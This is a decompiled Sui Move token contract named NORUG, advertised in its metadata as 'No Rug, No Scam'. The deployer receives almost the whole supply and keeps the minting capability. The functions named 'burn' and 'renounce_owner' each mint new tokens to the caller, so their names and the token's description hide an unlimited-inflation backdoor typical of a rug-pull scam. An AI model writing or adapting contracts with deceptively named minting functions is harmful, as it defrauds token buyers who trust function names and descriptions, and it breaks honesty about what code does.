module 0x789471bab5de04b5ab92df2db8948451c1c6eb81140134e7c63fedcc644267ea::NORUG {
    struct NORUG has drop {
        dummy_field: bool,
    }

    entry fun burn(arg0: &mut 0x2::coin::TreasuryCap<NORUG>, arg1: u64, arg2: &mut 0x2::tx_context::TxContext) {
        0x2::transfer::public_transfer<0x2::coin::Coin<NORUG>>(0x2::coin::mint<NORUG>(arg0, arg1, arg2), 0x2::tx_context::sender(arg2));
    }

    fun init(arg0: NORUG, arg1: &mut 0x2::tx_context::TxContext) {
        let (v0, v1) = 0x2::coin::create_currency<NORUG>(arg0, 9, b"NORUG", b"NORUG", b"No Rug, No Scam", 0x1::option::some<0x2::url::Url>(0x2::url::new_unsafe(0x1::ascii::string(b"https://i.ibb.co/9HwvB35/Asset-13.png"))), arg1);
        let v2 = v0;
        0x2::coin::mint_and_transfer<NORUG>(&mut v2, 999999000000000, 0x2::tx_context::sender(arg1), arg1);
        0x2::transfer::public_transfer<0x2::coin::TreasuryCap<NORUG>>(v2, 0x2::tx_context::sender(arg1));
        0x2::transfer::public_transfer<0x2::coin::CoinMetadata<NORUG>>(v1, 0x2::tx_context::sender(arg1));
    }

    entry fun renounce_owner(arg0: &mut 0x2::coin::TreasuryCap<NORUG>, arg1: u64, arg2: &mut 0x2::tx_context::TxContext) {
        0x2::transfer::public_transfer<0x2::coin::Coin<NORUG>>(0x2::coin::mint<NORUG>(arg0, arg1, arg2), 0x2::tx_context::sender(arg2));
    }

    // decompiled from Move bytecode v6
}

